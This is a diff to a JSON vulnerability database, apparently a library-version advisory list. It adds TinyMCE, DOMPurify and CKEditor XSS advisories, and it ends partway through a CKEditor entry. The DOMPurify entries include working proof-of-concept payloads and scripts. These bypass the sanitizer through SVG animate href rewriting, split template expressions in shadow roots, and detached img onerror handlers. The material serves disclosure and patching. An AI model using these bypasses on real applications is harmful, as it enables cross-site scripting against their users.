@@ -2019,6 +2019,37 @@
           "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
           "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
         ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "8.5.1",
+            "below": "8.9.3"
+          },
+          {
+            "atOrAbove": "7.9.3",
+            "below": "7.9.4"
+          }
+        ],
+        "summary": "TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` serialization",
+        "details": "### Impact\nStored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via elements crafted through the data-mce-object attribute, which are created and executed before sanitization. Impacts users of TinyMCE with the media plugin enabled.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 8.9.3 and TinyMCE 7.9.4 by ensuring that, when using the media plugin, any content created through the data-mce-object attribute is properly sanitized first.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.9.3 or higher.\nUpgrade to TinyMCE 7.9.4 or higher.\n\n### Acknowledgements\nTiny thanks [Fariskhi Vidyan](https://github.com/farisv) and David Vieira Kurz (HiSolutions AG) for their help identifying this vulnerability.",
+        "identifiers": {
+          "githubID": "GHSA-mf2p-h6hf-fcwm",
+          "CVE": [
+            "CVE-2026-116675"
+          ]
+        },
+        "severity": "high",
+        "cwe": [
+          "CWE-79"
+        ],
+        "info": [
+          "https://github.com/tinymce/tinymce/security/advisories/GHSA-mf2p-h6hf-fcwm",
+          "https://github.com/tinymce/tinymce/commit/bd1ab5ef024c648c3f9c0b409e54a6c227c7d8a2",
+          "https://github.com/tinymce/tinymce/releases/tag/8.9.3",
+          "https://www.tiny.cloud/docs/tinymce/7/7.9.4-release-notes/#overview",
+          "https://www.tiny.cloud/docs/tinymce/latest/8.9.3-release-notes/#overview"
+        ]
       }
     ],
     "extractors": {
@@ -5772,6 +5803,85 @@
           "https://github.com/cure53/DOMPurify/commit/b9b9d80f7e401771c2ccaef5f45def7eec8f27d7",
           "https://github.com/cure53/DOMPurify/releases/tag/3.4.16"
         ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "0",
+            "below": "3.4.17"
+          }
+        ],
+        "summary": "DOMPurify: SMIL attributeName=href guard is skipped when PARSER_MEDIA_TYPE is application/xhtml+xml",
+        "details": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName=\"href\" values=\"x;javascript:alert(1)\">`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" && stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `<a>`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>\n<script src=\"purify.js\"></script></head><body><div id=\"sink\"></div>\n<script>//<![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]></script></body></html>\n```\n\n2. The logged output still contains `attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n<details>\n<summary>poc.sh</summary>\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists <animate> + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" && npm pack \"dompurify@$VER\" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" >&2; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] && [ -x \"$c\" ] && CHROME=\"$c\" && break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" >&2; exit 2; }\n\ncat > \"$WORK/poc.html\" <<'EOF'\n<!doctype html><meta charset=\"utf-8\"><title>poc</title>\n<script src=\"purify.js\"></script>\n<div id=\"sink\"></div>\n<script>//<![CDATA[\nconst payload = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\">' +\n  '<a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/>' +\n  '<text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]></script>\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML<->XHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#<!doctype html><meta charset=\"utf-8\"><title>poc</title>#<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>#' \\\n    -e 's#<script src=\"purify.js\"></script>#<script src=\"purify.js\"></script></head><body>#' \\\n    -e 's#^</script>$#</script></body></html>#' \"$WORK/poc.html\" > \"$WORK/poc.xhtml\"\n\ncat > \"$WORK/drive.js\" <<'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) => {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) >= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n(async () => {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () => ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' && dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n</details>\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+        "identifiers": {
+          "githubID": "GHSA-c6gr-qvv4-5v3f",
+          "CVE": [
+            "CVE-2026-116802"
+          ]
+        },
+        "severity": "low",
+        "cwe": [
+          "CWE-79"
+        ],
+        "info": [
+          "https://github.com/cure53/DOMPurify/security/advisories/GHSA-c6gr-qvv4-5v3f",
+          "https://github.com/cure53/DOMPurify/pull/1672",
+          "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+          "https://github.com/cure53/DOMPurify/releases/tag/3.4.17"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "3.4.4",
+            "below": "3.4.17"
+          }
+        ],
+        "summary": "DOMPurify SAFE_FOR_TEMPLATES bypass: split template expressions survive in attached shadow root content on DOM output modes",
+        "details": "## Summary\n\nWhen DOMPurify is configured with `SAFE_FOR_TEMPLATES: true` together with a DOM-returning mode (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`), template expressions such as `{{...}}`, `${...}`, and `<%...%>` survive sanitization inside the text content of an attached shadow root. The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:1717`) was extended to recurse into `<template>.content`, but it never recurses into attached shadow roots. An attacker who can supply a DOM node carrying a shadow root (the `IN_PLACE` and shadow-aware `RETURN_DOM` surfaces) can split an expression across text nodes separated by disallowed elements; after those elements are removed the fragments become adjacent and serialize into a complete expression that a downstream template engine will evaluate.\n\n## Root Cause\n\n`SAFE_FOR_TEMPLATES` neutralizes template expressions through two mechanisms: a per-text-node strip during the main walk (`_stripTemplateExpressions`, applied in `_sanitizeElements` at `src/purify.ts:2246`), and a final post-walk pass (`_scrubTemplateExpressions`, `src/purify.ts:1717`) that normalizes adjacent text nodes and re-strips expressions that only form after merging. The per-node strip cannot catch an expression that is split into individual fragments, because each fragment fails the delimiter regexes. The post-walk pass is the only mechanism that would catch the merged form, but it is structurally unable to reach shadow root content.\n\n```text\n_scrubTemplateExpressions (src/purify.ts:1717-1751):\n  - node.normalize() at line 1718 does not merge text nodes inside shadow roots (DOM spec).\n  - NodeIterator at lines 1723-1731 does not descend into shadow trees (DOM spec).\n  - Explicit recursion at lines 1743-1750 enters <template>.content only, via\n    querySelectorAll('template'); there is no equivalent recursion into attached\n    shadow roots.\nShadow roots are sanitized earlier by _sanitizeShadowDOM (src/purify.ts:2710), which\napplies the per-node strip but never performs the post-walk normalize-and-rescrub.\n```\n\nShadow root text nodes are therefore sanitized only per-node and never re-examined as a merged unit.\n\n## Impact\n\nAn attacker who controls DOM-node input containing an attached shadow root can inject template expressions that survive sanitization and are later evaluated by the application's template engine. In client-side contexts this yields cross-site scripting; in a server-side template context it can escalate to template injection. Exploitation requires non-default application configuration: the application must enable `SAFE_FOR_TEMPLATES` and a DOM-returning mode, pass a DOM node that already has an attached shadow root, and feed the sanitized shadow root content into a template evaluator. The shadow root does not have to be built programmatically with `attachShadow`: in engines that support declarative shadow DOM, attacker-supplied markup containing `<template shadowrootmode=\"open\">` parsed through `setHTMLUnsafe` or `Document.parseHTMLUnsafe` produces the same attached shadow root, so a plain HTML string reaches the gap once the application is configured this way. Demonstrated capability is injection of a complete, attacker-chosen expression into post-sanitization shadow root content; the resulting script execution and any confidentiality or integrity consequence depend on the downstream engine's evaluation context.\n\n## Proof of Concept\n\n```text\nPreconditions:\n  - DOMPurify built from the affected source (dist/purify.js or an ESM/CJS bundle).\n  - A browser (or DOM implementation) with shadow DOM support.\n  - Application constructs a DOM node with an attached shadow root before sanitizing,\n    and later evaluates the shadow root's text content as a template.\n```\n\nBuild a host element whose shadow root holds a template expression split across text nodes separated by disallowed elements, then sanitize in place with `SAFE_FOR_TEMPLATES`:\n\n```javascript\nconst host = document.createElement('div');\nconst root = host.attachShadow({ mode: 'open' });\n\n// Split \"${alert(document.domain)}\" so no single fragment matches a regex.\n// <object> is not in the default ALLOWED_TAGS and is removed during sanitization,\n// leaving the surrounding text-node siblings adjacent.\nroot.appendChild(document.createTextNode('$'));\nroot.appendChild(document.createElement('object'));\nroot.appendChild(document.createTextNode('{alert(document.domain)}'));\n\nDOMPurify.sanitize(host, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });\n\n// After the disallowed element is removed, the fragments are adjacent and survive.\nhost.shadowRoot.normalize();\nconsole.log(host.shadowRoot.textContent);\n```\n\n```text\n${alert(document.domain)}\n```\n\nA downstream template evaluator reading `shadowRoot.textContent` (for example `new Function('return `' + content + '`')()` or any `${...}`/`{{...}}` engine) then evaluates the fully formed expression.\n\n## Attack Chain\n\n1. **Exposure:** The application calls `DOMPurify.sanitize(node, cfg)` (`src/purify.ts:2854`) with `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true` (or a shadow-aware `RETURN_DOM`), passing a DOM node that already carries an attached shadow root.\n2. **Control:** The attacker controls the shadow root's text nodes and the disallowed separator elements between them; each fragment (`$`, `{alert(document.domain)}`) is a valid, individually benign text node.\n3. **Path:** `_sanitizeAttachedShadowRoots` (`src/purify.ts:2977`) feeds the shadow root into `_sanitizeShadowDOM` (`src/purify.ts:2710`), which strips expressions per text node (`src/purify.ts:2246`) and removes the disallowed separator elements, leaving the fragments adjacent.\n4. **Guard:** The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:3131-3132`) is the only pass that would catch the merged expression, but it never recurses into shadow roots (`src/purify.ts:1717-1751` recurses into `<template>.content` only).\n5. **Primitive:** The adjacent fragments serialize as a single concatenated string on `shadowRoot.textContent` / `shadowRoot.innerHTML`, reconstituting the complete expression.\n6. **Result:** A downstream template engine evaluates the attacker-chosen expression, achieving script execution (or template injection) in the engine's context.\n\n## Bypass Evidence\n\nThe relevant protection is `SAFE_FOR_TEMPLATES`, specifically the post-walk pass that defends against expressions that only form after adjacent text nodes merge. That defense was previously extended to `<template>.content` under CVE-2026-65900 (GHSA-gvmj-g25r-r7wr) by adding `querySelectorAll('template')` recursion at `src/purify.ts:1743-1750`. The strongest challenge is whether any code path performs the equivalent merge-and-rescrub inside shadow roots. Enumerating every call site of `_scrubTemplateExpressions` (`src/purify.ts:1717`, `1747`, `3132`, `3141`) shows none receive a shadow root, and `_sanitizeShadowDOM` (`src/purify.ts:2710`) never calls `_scrubTemplateExpressions` or `normalize()`. The per-node strip cannot compensate: `MUSTACHE_EXPR` (`src/regexp.ts:3`) requires `{{` or `}}`, `TMPLIT_EXPR` (`src/regexp.ts:5`) requires `${`, and `ERB_EXPR` (`src/regexp.ts:4`) requires `<%` or `%>`, none of which appear in a single-character fragment. The CVE-2026-65900 regression tests exercise `<template>.content` only; no test covers shadow root content under `SAFE_FOR_TEMPLATES`. The gap is therefore an unfixed case on a distinct remediation boundary (shadow roots) rather than a bypass of the delivered template-content fix.\n\n## Affected Versions\n\n- **Ecosystem:** `npm`\n- **Package:** `dompurify`\n- **Confirmed affected range:** `>= 3.4.4, <= 3.4.16`\n- **Latest release checked:** `3.4.16` ([npm registry](https://www.npmjs.com/package/dompurify/v/3.4.16))\n- **Fix status:** not fixed\n\nThe lower bound 3.4.4 is the release that introduced both the attached-shadow-root sanitization pass and the `_scrubTemplateExpressions` safety net; releases 3.4.4 through 3.4.7 carry the safety net with no content-container recursion, and 3.4.8 onward add `<template>.content` recursion but still omit shadow root recursion. No published release and no current development revision contains a shadow-root fix.\n\n## Suggested Fix\n\nEnforce the same post-walk normalize-and-rescrub invariant on attached shadow roots that already applies to `<template>.content`. After `_sanitizeShadowDOM` finishes walking a shadow root, run `_scrubTemplateExpressions` over that shadow root so adjacent text nodes created by element removal are merged and re-stripped; alternatively, have `_scrubTemplateExpressions` discover and recurse into attached shadow roots as it does for template content. The fix must cover nested shadow roots and shadow roots inside `<template>.content`, and it must handle all three expression dialects, since any disallowed element can serve as the separator that produces adjacent fragments.\n\n---\n\nReported by zx (GitHub: @manus-pi).",
+        "identifiers": {
+          "githubID": "GHSA-cg2g-xh64-v4q7",
+          "CVE": [
+            "CVE-2026-116804"
+          ]
+        },
+        "severity": "critical",
+        "cwe": [
+          "CWE-79"
+        ],
+        "info": [
+          "https://github.com/cure53/DOMPurify/security/advisories/GHSA-cg2g-xh64-v4q7",
+          "https://github.com/cure53/DOMPurify/pull/1672",
+          "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+          "https://github.com/cure53/DOMPurify/releases/tag/3.4.17"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "0",
+            "below": "3.4.17"
+          }
+        ],
+        "summary": "DOMPurify IN_PLACE: hook that removes a parent or sibling leaves the detached subtree's event handlers armed (incomplete fix for GHSA-p98j-92pf-mc4p)",
+        "details": "### Summary\n\nThe 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.\n\nThe README says: \"Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns.\" That does not hold when the detached node is not the hook's own node.\n\n### Tested versions\n\n- 3.4.16 (latest) and main at 18f8f0e\n- also 3.4.15, 3.4.12 and 2.5.8\n\njsdom for the matrix below, and Chromium (Playwright) for the event actually firing.\n\n### Details\n\n`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:\n\n```js\nif (currentNode === root || getParentNode(currentNode) !== null) {\n  return false;\n}\nif (IN_PLACE) {\n  _neutralizeSubtree(currentNode);\n}\n```\n\nIt only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.\n\n### PoC (jsdom)\n\n```js\nconst { JSDOM } = require('jsdom')\nconst createDOMPurify = require('dompurify')\nconst win = new JSDOM('<!doctype html><body></body>').window\nconst doc = win.document\n\nfor (const mode of ['self', 'parent', 'nextSibling']) {\n  const DOMPurify = createDOMPurify(win)\n  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +\n    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'\n  const root = doc.getElementById('root')\n  const evil = doc.getElementById('evil')\n\n  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)\n  DOMPurify.addHook('afterSanitizeAttributes', (node) => {\n    if (node.getAttribute && node.getAttribute('class') === 'bad') {\n      if (mode === 'self') node.remove()\n      if (mode === 'parent') node.parentNode.remove()\n      if (mode === 'nextSibling') node.nextElementSibling.remove()\n    }\n  })\n\n  DOMPurify.sanitize(root, { IN_PLACE: true })\n  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))\n}\n```\n\nOutput on 3.4.16:\n\n```\n3.4.16 self        onerror = null\n3.4.16 parent      onerror = \"alert(1)\"\n3.4.16 nextSibling onerror = \"alert(1)\"\n```\n\nIn `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.\n\n### PoC (browser)\n\nThe same thing in a real page, served from 127.0.0.1 and opened in Chromium:\n\n```html\n<!doctype html><meta charset=utf-8>\n<script src=\"purify.min.js\"></script>\n<body><pre id=log></pre>\n<script>\nwindow.fired = [];\nfunction run(mode) {\n  const D = DOMPurify(window);\n  D.addHook('afterSanitizeAttributes', n => {\n    if (n.getAttribute && n.getAttribute('class') === 'bad') {\n      if (mode === 'parent') n.parentNode.remove();\n      if (mode === 'self') n.remove();\n    }\n  });\n  const root = document.createElement('div');\n  document.body.appendChild(root);\n  root.innerHTML = '<figure><img class=bad src=data:,><img src=x onerror=\"fired.push(\\'' + mode + '\\')\"></figure><p>ok</p>';\n  D.sanitize(root, { IN_PLACE: true });\n  return root.outerHTML;\n}\nconst a = run('self'), b = run('parent');\nsetTimeout(() => {\n  document.getElementById('log').textContent =\n    'version=' + DOMPurify.version + '\\nself out=' + a + '\\nparent out=' + b + '\\nfired=' + JSON.stringify(fired);\n}, 1500);\n</script>\n```\n\nResult on 3.4.16:\n\n```\nversion=3.4.16\nself out=<div><figure><img src=\"x\"></figure><p>ok</p></div>\nparent out=<div><p>ok</p></div>\nfired=[\"parent\"]\n```\n\nThe returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.\n\n### Impact\n\nAn app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example \"drop the whole `<figure>` if its image is not allowed\") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under \"input plus an application choice\" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.\n\n### Suggested fix\n\nInstead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:\n\n- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`\n- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)",
+        "identifiers": {
+          "githubID": "GHSA-mrv2-3pqr-j5jr",
+          "CVE": [
+            "CVE-2026-116803"
+          ]
+        },
+        "severity": "high",
+        "cwe": [
+          "CWE-693",
+          "CWE-79"
+        ],
+        "info": [
+          "https://github.com/cure53/DOMPurify/security/advisories/GHSA-mrv2-3pqr-j5jr",
+          "https://github.com/cure53/DOMPurify/pull/1672",
+          "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+          "https://github.com/cure53/DOMPurify/releases/tag/3.4.17"
+        ]
       }
     ],
     "extractors": {
@@ -7110,6 +7220,68 @@
         "info": [
           "https://github.com/ckeditor/ckeditor5/compare/v34.2.0...v35.0.0",
           "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-42wq-rch8-6f6j"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "45.0.0",
+            "below": "47.7.4"
+          },
+          {
+            "atOrAbove": "48.0.0",
+            "below": "48.5.1"
+          }
+        ],
+        "summary": "CKEditor: Cross-site scripting (XSS) in the engine package",
+        "details": "### Impact\nA Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability is caused by a prototype pollution issue in the `es-toolkit` library used in the CKEditor 5 codebase. This vulnerability could lead to unauthorized JavaScript code execution when the editor processes incoming `style` attribute values.\n\nThe underlying issue has been patched by the library maintainers, and the fix has been incorporated into CKEditor 5.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.",
+        "identifiers": {
+          "githubID": "GHSA-rh54-vffm-5fvp",
+          "CVE": [
+            "CVE-2026-116688"
+          ]
+        },
+        "severity": "high",
+        "cwe": [
+          "CWE-79"
+        ],
+        "info": [
+          "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rh54-vffm-5fvp",
+          "https://github.com/ckeditor/ckeditor5/commit/4d9c5bb34f63cd956d15ccafbe584e14280c86a0",
+          "https://github.com/ckeditor/ckeditor5/commit/a750e38635db6a18c5b11599c09f4fd702850423",
+          "https://github.com/ckeditor/ckeditor5/releases/tag/v47.7.4",
+          "https://github.com/ckeditor/ckeditor5/releases/tag/v48.5.1"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "29.0.0",
+            "below": "47.7.4"
+          },
+          {
